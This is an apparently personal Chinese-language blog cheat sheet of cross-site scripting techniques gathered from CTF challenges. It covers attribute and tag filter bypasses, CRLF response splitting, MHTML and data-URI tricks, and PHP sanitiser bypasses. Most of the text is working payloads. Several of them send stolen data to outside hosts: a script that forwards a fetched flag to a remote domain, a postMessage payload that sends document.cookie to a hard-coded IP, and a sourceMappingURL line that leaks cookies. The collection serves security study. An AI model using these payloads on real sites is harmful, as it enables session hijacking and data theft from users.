---
title: xss
abbrlink: 52452
date: 2018-03-27 16:27:13
tags:
---
link 标签引入外部 js。

```javascript
也可以用域名，将 . 用 。 代替。
<link rel=import href=\\八进制ip
<link/rel=import href=https:\\d7cb7b72.w1n.pw\background.html>
```

```javascript
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://router.vip/flag.php", false);
  xhr.send();
  a=xhr.responseText;
  location.href='https://master.xbfzss.cn/?a='+escape(a);
</script>
```

xss:
jquery版本>=1.9
sourceMappingURL加载外部资源
<script>//# sourceMappingURL=https://xxx.com/?${escape(document.cookie)}</script>

```
<input name=keyword  value="<scrilpt>alert(1);</script>">
payload:" onmouseover=alert(1) "
<input name=keyword  value="" onmouseover=alert(1) "">
```

```
<input name=keyword  value=''>
payload:' onmouseover=alert(1) '
<input name=keyword  value=' onmouseover=alert(1) ''>
```

```
<input name=keyword  value="">
过滤了on
<input name=keyword  value="" o_nclick=alert(1) "">

payload:"><a href="javascript:alert(1)" >as</a>
<input name=keyword  value=""><a href="javascript:alert(1)" ></a>">
```
```
<input name=keyword  value="">
过滤了on
<input name=keyword  value="" o_nclick=alert(1) "">

payload:"><a href="javascript:alert(1)" >as</a>
<input name=keyword  value=""><a href="javascript:alert(1)" ></a>">
```

空格可以使用%0a，%0d绕过

= onmouseover=alert\`1\`
alert(1)   两边的括号可以使用``替换

```
<html>
<script type="text/javascript">
var call_window;
call_window = window.open("http://localhost/call.php");
setTimeout(function(){
    call_window.postMessage({
      type: "audio",
      details: {
      sender_username: "<img src=xx: onerror=window.open('http://123.207.90.143/index.php?a='+document.cookie)>",
        sender_team_name: "zzzz",
        receiver_username: "test",
        receiver_team_name: "test"
      }
    }, "*");
}, 1000);
</script>
</html>
```

## CRLF 注射攻击（HTTP ResponseSplitting）(HRS)

``` .aspx
nameValueCollection request = Request.QueryString;
Response.Cookies["username"].Value = request["text"]
```

正常访问:

> http://www.test.com/demo.aspx?text=test

正常情况下，会使用text=test来setcookie

payload:

> http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked

正常情况下：HTTP Response如下:

> HTTP/1.1 200 OK
>
> Set-Cookie: userName=test
>
> Content-Type: text/html; charset-utf-8

使用payload的情况下:

> HTTP/1.1 200 OK
>
> Set-Cookie: username=a
>
> Set-Cookie: HackedCookie=Hacked
>
> Content-Type: text/html; charset-utf8

更严重的情况下:

payload:

> http://www.test.com/page.php?page=%0d%0aContent-Type: text/html%0D%0AHTTP/1.1 200 OK %0D%0AContent-Type: text/html%0D%0A%0D%0A%3Chtml%3EHacker Content%3C/html%3E

该代码明显恶意，但是浏览器也会执行。

## MHTML协议安全[IE浏览器]

MHTML协议格式:

> mhtml: [Mhtml_File_Url]![Original_Resource_Url]

新建一个HTML文件，demo.html

```html
Content-Type: multipart/related; boundary="_boundary_by_mere"

--_boundary_by_mere
Cotent-Location: demo
Content-Transfer-Encoding: base64

PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ=
--_boundary_by_mere--
```

当使用如下链接进行访问的时候，就会弹窗：

> mhtml:http://127.0.0.1/demo.html!demo

注意:为了让IE调用MHTML Protocol Handler将该资源当做MHTML格式文件解析处理，需要把URL修改为MHTML协议，在"http"之前加上"mhtml:"，在url后边加上"!demo"字样。

此外，还可以结合CRLF漏洞实现XSS。

首先PHP脚本如下(test.php):

```php
<?php
    echo $_GET['k'];
?>
```

构造url:

> mhtml:http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss

## 利用Data URIs进行XSS

该方案和MHTML有些类似。Data URI格式如下:

>  data:\[<mime type>\]\[;charset=<charset>\]\[;base64\],<encoded data>

> data指代URI协议
>
> mime type 代表数据类型，如PNG图片则为image/png,若无说明，默认为text/plain
>
> charset 如果不适用base64，则使用charset指定的字符类型
>
> encoded data 对应的编码信息

例如:

```html
<img src="data:image/gif;base64,R0lGODlhMwAxAIAAAAAAAP///
yH5BAAAAAAALAAAAAAzADEAAAK8jI+pBr0PowytzotTtbm/DTqQ6C3hGX
ElcraA9jIr66ozVpM3nseUvYP1UEHF0FUUHkNJxhLZfEJNvol06tzwrgd
LbXsFZYmSMPnHLB+zNJFbq15+SOf50+6rG7lKOjwV1ibGdhHYRVYVJ9Wn
k2HWtLdIWMSH9lfyODZoZTb4xdnpxQSEF9oyOWIqp6gaI9pI1Qo7BijbF
ZkoaAtEeiiLeKn72xM7vMZofJy8zJys2UxsCT3kO229LH1tXAAAOw==">
```

XSS隐患，执行XSS最常用的方法是引入<script>标签，如果过滤，就没有办法使用了。

> \<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+"\>test\</a\>

其中:

> PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+

解码后:

> \<script\>alert('xss');\</script\>

这种方法，现在不支持，同样不支持的还有<meta>标签，  chrome和firefox都会禁止。  

>  <meta http-equiv="Refresh" content="0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+">

<object>则可以使用,<iframe>也行。

> <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+"></object>
>
> <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+"></iframe>

## simple xss

XSS payload只允许使用大小写字母数字加上`<^*~\-|_=+`这些特殊符号，那么大概只有两种方案：

1. 利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作
2. 利用某些奇怪的HTML标签特性

比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某`LC↯BC`队<https://ctftime.org/writeup/5956> 脑洞出来了个奇葩思路

><svg id=\ onload=location=id+id+12345609861+domain+id+1234+id 

我们（nao）想（dong）出来的payload有如下几个关键点：

1. Chrome会把域名中的`。`（全角句号）理解成`.`
2. `<link rel=import`这种标签会把html import到当前页面里....N年前玩polymer的时候常用的一种标签...这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行
3. `\\`会被Chrome理解成`//`，`\`也会理解成`/` （其实这里有个小插曲，我Win10上的Chrome会把`\\`理解成windows资源管理器里敲的那种`\\`也就是samba协议(或`file://`伪协议)...所以这种payload XSS Windows貌似是不行...?）， 因此`\\example。com\xssHtml`会变成`//example.com/xssHtml`

综上，payload:

> <link rel=import href=\\example。com\xssHtml other= 

## RSS中的XSS

略

## 浏览器差异

```html
<script type="text/javascript"><!--
    var x = "xssed</script x\><script x\>alert(/xss/);//";
//--></script>
```

Chrome会动态修正一些节点，如将</script x\>修正为</script>，由于该特性只是按照标签配对，没有考虑HTML注释或其他复杂情况，会导致xss.

## img编码绕过

```html
<img src="" onerror="j&#00097vascript:alert('xss');">
<img src="" onerror="j&#97vascript:alert('xss1');">
<img src="" onerror=" javascript:alert('xss3');">
```

## a绕过,javascript伪协议

```
"><a href="javascript:alert(1)">click me</a><"
```

## body和div

```
"><body onload=alert(1)><"
"><div onclick="alert('xss')">click me<"
```

## 过滤括号

```php
<?php 
    ini_set("display_errors", 0); 
	$str = strtolower(@$_POST["keyword"]); 
	while (strpos($str,'script')) {$str = str_replace('script', '', $str);} 
	$str = str_replace('(', '', $str); 
	$str = str_replace(')', '', $str); 
	echo ' <form class="main" action="index.php" method="POST"> <input name=keyword size=60 value="'.$str.'"> <input type=submit name=submit value="Search"/> </form>'; echo '<p class="main">No results for "<b>'.htmlspecialchars($str).'</b>"</p>'; ?>
```

```
"><body onload=alert`1`><"
" onfocus=alert`1` "
```

## 过滤`',",' '   `

有时候用斜杠是可以代替空格的

```
<?php 
    ini_set("display_errors", 0); 
	$str = strtolower(@$_POST["keyword"]); 
	while (strpos($str,'script')) {$str = str_replace('script', '', $str);} 
	$str = str_replace('(', '', $str); 
	$str = str_replace(')', '', $str); 
	$str = str_replace(' ', '', $str); 
	echo ' <form class="main" action="index.php" method="POST"> <input name=keyword size=60 value="'.$str.'"> <input type=submit name=submit value="Search"/> </form>'; echo '<p class="main">No results for "<b>'.htmlspecialchars($str).'</b>"</p>'; ?
```

```
"/onfocus=alert`1`/"
"><img/src='1'/onerror=alert`0`><"
"><<svg/onload=alert`1`><"
```

## 过滤尖括号里边的所有东西

```
<?php 
    ini_set("display_errors", 0); 
	$str = strtolower(@$_POST["keyword"]); 
	$str = preg_replace("/<.*?>/", '', $str);
	echo ' <form class="main" action="index.php" method="POST"> <input name=keyword size=60 value="'.$str.'"> <input type=submit name=submit value="Search"/> </form>'; echo '<p class="main">No results for "<b>'.htmlspecialchars($str).'</b>"</p>'; ?
```

```
" type=image src=x onerror=alert(1) "
=> <input type=image src=x onerror=alert(1)>
input会被当做img标签使用

"/onfocus=alert`1`/"             => 不会自动触发
```

## js中的连接符

```
 <?php 
 	ini_set("display_errors", 0); 
 	$name = $_GET["name"]; 
 	echo '<h3 class="main">No results for "<b>'; echo htmlspecialchars($name).'</b>"</h3>'; echo ' <script> var t="'.$name.'"; var s="xxxxxxxx"; var d="dddd"; </script>'; ?> 
```

```
这里就是一个新的输出点了，你的值是输出在js代码中的 只要闭合双引号，然后就可以写你自己的js代码了 比如 "-alert(1)-" 赋值给url中的name即可 -是js中的连接符号


name=";alert(1);//
```

##  危险字符

| <    | &lt          |
| ---- | ------------ |
| >    | ```&gt;```   |
| &    | ```&amp;```  |
| "    | ```&quot;``` |
| '    | ```&#39```   |

## Dom-Based XSS

> document.URL
>
> document.URLUencoded
>
> document.location(.pathname|.href|.search|.hash)
>
> window.location(.pathname|.href|.search|.hash)
>
> document.referrer
>
> window.name
>
> document.cookie
>
> HTML5 postMessage
>
> localStorage/globalStorage
>
> XMLHTTPRequest response
>
> Input.value

## htmlspecialchars可绕过情况

```
echo "<input type=\"text\" value='" + htmlspecialchars($str) + "'>Please input the t1 as parameter";
```

```
$str = ' onmouseover=alert(1) > //
```

因为htmlspecialchars默认只过滤`<`，`>`, `"`，`&`,默认为`ENT_COMPAT`

```
ENT_COMPAT - 默认。仅编码双引号。
ENT_QUOTES - 编码双引号和单引号。
ENT_NOQUOTES - 不编码任何引号。
```

## addslashes

```
echo "<input type=\"text\" value='" + addslashes($str) +"'>Please input the t1 as parameter";
```

paylaod1:

```
$str = ' onmouseover=alert(1) //
=> 源码:
<input type="text" value='\' onmouseover=alert(1) //'>Please input the t2 as parameter
=> 浏览器处理结果:
<input value="\" onmouseover="alert(1)//'" type="text">
```

在火狐里边也能触发，如果去掉 `//` 则无法触发，应该是`//` 注释掉了后边的单引号，浏览器处理出现问题

如果使用以上 payload,浏览器最终结果:

```
<input value="\" onmouseover="alert(1)//'" type="text">
```

如果去掉`//`

```
$str = ' onmouseover=alert(1) //
=> 源码:
<input type="text" value='\' onmouseover=alert(1)'>Please input the t2 as parameter
=> 浏览器处理结果：
<input type="text" value='\' onmouseover=alert(1)'>Please input the t2 as parameter
```

这时候，就无法触发alert。

paylaod2: 

这个payload只能在编码为gbk的情况下才能使用。

```
<meta charset="gbk">
```

```
 %df'><script>alert(1)</script> //
```

## strip_tags绕过

```
echo '<input type="text" value="' + strip_tags($str) +'">Please input the t1 as parameter';
```

payload:

```
" onmouseover=alert(1) //
```

